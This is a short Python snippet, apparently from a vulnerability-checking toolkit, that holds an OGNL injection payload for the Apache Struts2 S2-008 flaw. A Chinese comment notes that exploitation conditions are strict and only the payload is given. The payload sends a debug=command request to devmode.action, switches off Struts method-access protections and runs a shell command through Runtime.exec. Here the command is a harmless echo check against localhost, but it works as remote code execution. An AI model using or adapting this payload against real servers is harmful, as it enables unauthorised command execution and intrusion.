import requests
import urllib
'''
利用条件苛刻，实战价值不大，仅贴payload。
'''
payloads = ("http://localhost:8080/S2-008/devmode.action?debug=command&expression=(#_memberAccess["
            "\"allowStaticMethodAccess\"]=true,#foo=new java.lang.Boolean(\"false\") ,#context["
            "\"xwork.MethodAccessor.denyMethodExecution\"]=#foo,@java.lang.Runtime@getRuntime().exec(\"echo S2_008_vuln\"))")